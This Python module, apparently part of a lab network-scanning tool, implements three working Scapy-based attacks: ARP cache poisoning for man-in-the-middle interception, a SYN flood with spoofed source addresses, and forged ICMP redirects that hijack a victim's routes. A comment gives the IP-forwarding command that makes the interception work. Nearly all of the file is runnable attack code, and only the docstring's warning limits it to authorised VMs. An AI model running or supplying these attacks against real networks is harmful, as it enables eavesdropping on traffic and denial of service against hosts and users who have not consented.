"""
scanner/attacks.py
------------------
Attack Simulation Module — FOR AUTHORISED LAB / VM USE ONLY.

Each attack:
  • Runs in its own background thread.
  • Accepts a threading.Event() stop_flag so it can be cleanly stopped.
  • Calls on_packet() callback to stream packet events to the frontend.
  • Tracks packets_sent so the frontend can display a live counter.

⚠️  LEGAL WARNING: Running these against systems you don't own is illegal.
    Use only on your own VMs / host-only adapter lab networks.
"""
import time
import random
import threading
from datetime import datetime
from scapy.all import (
    Ether, ARP, IP, TCP, ICMP,
    sendp, send, RandShort, conf
)

conf.verb = 0  # suppress Scapy stdout


# ─────────────────────────────────────────────────────────────────────────────
# Helper: current timestamp string
# ─────────────────────────────────────────────────────────────────────────────
def _ts():
    return datetime.utcnow().isoformat()


# ─────────────────────────────────────────────────────────────────────────────
# 1. ARP Spoofing
# ─────────────────────────────────────────────────────────────────────────────

def arp_spoof(
    target_ip: str,
    gateway_ip: str,
    stop_flag: threading.Event,
    on_packet=None,
    interval: float = 1.5
) -> dict:
    """
    Poison the ARP caches of both target and gateway so traffic between them
    flows through our machine (man-in-the-middle).

    How it works:
      • We send ARP "is-at" (op=2 reply) to the target claiming WE are the gateway.
      • We send ARP "is-at" (op=2 reply) to the gateway claiming WE are the target.
      • Both hosts update their ARP tables with our MAC.
      • Traffic between them now passes through us (if IP forwarding is enabled).

    ip_forwarding must be enabled on the attacker:
      echo 1 > /proc/sys/net/ipv4/ip_forward

    Parameters
    ----------
    target_ip  : victim host
    gateway_ip : default gateway (router)
    stop_flag  : set to stop sending
    on_packet  : streaming callback
    interval   : seconds between poison bursts (default 1.5s)
    """
    packets_sent = {"count": 0}

    while not stop_flag.is_set():
        # ── Poison target: "gateway IP is at attacker MAC" ──────────────────
        pkt_to_target = ARP(
            op=2,              # op=2 = "is-at" (reply)
            pdst=target_ip,    # send to victim
            psrc=gateway_ip,   # claim to BE the gateway
            # hwsrc defaults to our own MAC — that's the poison
        )

        # ── Poison gateway: "target IP is at attacker MAC" ──────────────────
        pkt_to_gateway = ARP(
            op=2,
            pdst=gateway_ip,
            psrc=target_ip,
        )

        send(pkt_to_target,  verbose=0)
        send(pkt_to_gateway, verbose=0)
        packets_sent["count"] += 2

        if on_packet:
            on_packet({
                "summary": (
                    f"ARP poison → {target_ip} (claiming {gateway_ip}) | "
                    f"→ {gateway_ip} (claiming {target_ip}) | "
                    f"total sent: {packets_sent['count']}"
                ),
                "flags": "ARP-SPOOF",
                "ttl": 0,
                "src_ip": "attacker",
                "dst_ip": f"{target_ip} / {gateway_ip}",
                "protocol": "ARP",
                "timestamp": _ts()
            })

        time.sleep(interval)

    return {"packets_sent": packets_sent["count"]}


# ─────────────────────────────────────────────────────────────────────────────
# 2. SYN Flood
# ─────────────────────────────────────────────────────────────────────────────

def syn_flood(
    target_ip: str,
    target_port: int,
    stop_flag: threading.Event,
    on_packet=None,
    burst: int = 100,
    interval: float = 0.05
) -> dict:
    """
    Overwhelm a TCP port by sending a continuous stream of SYN packets
    with randomised spoofed source IPs.

    The target allocates a half-open connection entry for each SYN it receives
    (until its backlog fills) — this exhausts connection table resources.

    Parameters
    ----------
    target_ip   : victim IP
    target_port : victim TCP port
    stop_flag   : set to stop
    on_packet   : streaming callback
    burst       : packets per iteration
    interval    : sleep between bursts (seconds)
    """
    packets_sent = {"count": 0}

    while not stop_flag.is_set():
        batch = []
        for _ in range(burst):
            # Randomise source IP to prevent easy blocking and simulate
            # traffic from many different hosts
            spoofed_src = f"{random.randint(1,254)}.{random.randint(0,254)}." \
                          f"{random.randint(0,254)}.{random.randint(1,254)}"

            pkt = IP(
                src=spoofed_src,    # spoofed source — target can't RST back
                dst=target_ip
            ) / TCP(
                sport=RandShort(),  # random source port
                dport=target_port,
                flags="S",          # SYN only — never complete the handshake
                seq=random.randint(0, 2**32 - 1)  # random seq number
            )
            batch.append(pkt)

        # send() each packet (Layer 3); no waiting for reply
        for pkt in batch:
            if stop_flag.is_set():
                break
            send(pkt, verbose=0)
            packets_sent["count"] += 1

        if on_packet:
            on_packet({
                "summary": (
                    f"SYN flood → {target_ip}:{target_port} | "
                    f"packets sent: {packets_sent['count']}"
                ),
                "flags": "SYN-FLOOD",
                "ttl": 64,
                "src_ip": "spoofed",
                "dst_ip": target_ip,
                "protocol": "TCP",
                "timestamp": _ts()
            })

        time.sleep(interval)

    return {"packets_sent": packets_sent["count"]}


# ─────────────────────────────────────────────────────────────────────────────
# 3. ICMP Redirect
# ─────────────────────────────────────────────────────────────────────────────

def icmp_redirect(
    target_ip: str,
    spoofed_gateway: str,
    attacker_ip: str,
    destination_ip: str,
    stop_flag: threading.Event,
    on_packet=None,
    count: int = 10,
    interval: float = 2.0
) -> dict:
    """
    Trick a host into rerouting traffic for a specific destination through us.

    ICMP Redirect (type 5, code 1):
      • Normally sent by a router to a host saying "use this better route".
      • We forge it as if coming from the victim's gateway.
      • Code 1 = "Redirect for Host" — reroute traffic to `destination_ip`
        through `attacker_ip`.

    Parameters
    ----------
    target_ip       : victim host
    spoofed_gateway : IP to masquerade as (usually the real gateway)
    attacker_ip     : IP we want traffic redirected to (our machine)
    destination_ip  : which destination traffic to hijack
    stop_flag       : set to stop
    on_packet       : streaming callback
    count           : packets per burst
    interval        : seconds between bursts
    """
    packets_sent = {"count": 0}

    while not stop_flag.is_set():
        for _ in range(count):
            if stop_flag.is_set():
                break

            # Outer IP: appears to come from the legitimate gateway
            outer_ip = IP(
                src=spoofed_gateway,  # forged source = gateway
                dst=target_ip
            )

            # ICMP Redirect payload
            icmp_layer = ICMP(
                type=5,           # type 5 = Redirect
                code=1,           # code 1 = Redirect for Host
                gw=attacker_ip    # "use this gateway instead"
            )

            # Inner IP: the original packet we're claiming triggered the redirect
            # (must be a valid IP header pointing to destination)
            inner_ip = IP(
                src=target_ip,
                dst=destination_ip
            )

            pkt = outer_ip / icmp_layer / inner_ip
            send(pkt, verbose=0)
            packets_sent["count"] += 1

        if on_packet:
            on_packet({
                "summary": (
                    f"ICMP Redirect (forged from {spoofed_gateway}) → "
                    f"{target_ip}: route {destination_ip} via {attacker_ip} | "
                    f"sent: {packets_sent['count']}"
                ),
                "flags": "ICMP-REDIRECT",
                "ttl": 64,
                "src_ip": spoofed_gateway,
                "dst_ip": target_ip,
                "protocol": "ICMP",
                "timestamp": _ts()
            })

        time.sleep(interval)

    return {"packets_sent": packets_sent["count"]}
